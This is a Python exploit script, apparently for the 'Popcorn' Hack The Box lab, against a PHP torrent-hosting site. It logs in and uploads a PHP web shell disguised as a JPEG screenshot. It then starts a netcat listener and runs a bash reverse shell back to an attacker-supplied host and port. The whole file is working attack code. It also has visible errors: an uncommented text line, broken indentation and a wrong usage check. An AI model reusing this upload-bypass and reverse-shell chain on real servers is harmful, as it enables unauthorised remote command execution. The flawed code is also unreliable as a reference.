import requests
import sys
import subprocess
import urllib.parse


RHOST = sys.argv[1]
LHOST = sys.argv[2]
PORT = sys.argv[3]

user_agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"

if len(sys.argv) < 3:
	print("USAGE: exploit.py <ADDRESS> <CMD>")
	quit()

data = {
"username":"test",
"password":"test"
}
#logging in as a user
session = requests.Session()
response= session.post(f"{RHOST}/torrent/login.php",data = data, allow_redirects=True)
if "Invalid login, please try again" in response.text:
	print("Please create a user with the following credentials and try again\nusername : test\npassword : test")
	quit()
else:
	print("succesfully logged in, proceeding with the exploit")

# Upload Torrent
parameters = {
	"type": 1,
	"subtype":1,
	"anonymous2":"false",
	"anonymous":"true",
	"autoset":"enabled",
	"registration":"false",
	"hideuser":"false",
	"submit":"Upload Torrent"
}
file_hash=''
torrent='file.torrent'
#uploading a torrent
with open(torrent,'rb') as file:
	upload= session.post(f"{RHOST}/torrent/torrents.php?mode=upload",data=parameters,files={"torrent":file},allow_redirects=True)
	if "this torrent allready exists in our database" in upload.text:
		#print(upload.text)
		print("this torrent file already exists on  the website, if it belongs to your user this script will proceed")
		ownership_check = session.get(f"{RHOST}/torrent/users")
		if torrent not in ownership_check.text:
			print("The file is not yours\nPlease upload a different torrent file")
			quit()
		file_hash=ownership_check.text.split("""<a href="http://popcorn.htb/torrent/torrents.php?mode=details&amp;id=""")
		file_hash=file_hash[1].split(""""><div align="center"><img src="http://popcorn.htb/torrent/images/details.png" width="16" height="16" border="0"></div></a>""")
		file_hash=file_hash[0]

#getting the hash
print("The file hash is " + file_hash)

uploading a shell instead of a screenshot
with open('cmd.php','rb') as file:
	headers = {
		"Content-Type": "image/jpeg",
		"User-Agent":user_agent
	}

	parameters ={
		"submit":"Submit Screenshot"
	}
	response = session.post(f"{RHOST}/torrent/edit.php?mode=edit&id={file_hash}",files={"file":file},data=parameters,headers=headers,allow_redirects=True)
	print(response.text)
	if "Please note that you are allow to upload only one screenshot per torrent." in response.text:
	 	print("do not upload a different file")
		quit()

#webshell
print("\nenjoy your shell")
listener = subprocess.Popen(["nc","-lvnp","9001"])
command = urllib.parse.quote(f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1'")
response = requests.get(f"""{RHOST}/torrent/upload/{file_hash}.php?cmd={command}""")
print(response.text)
listener.wait()
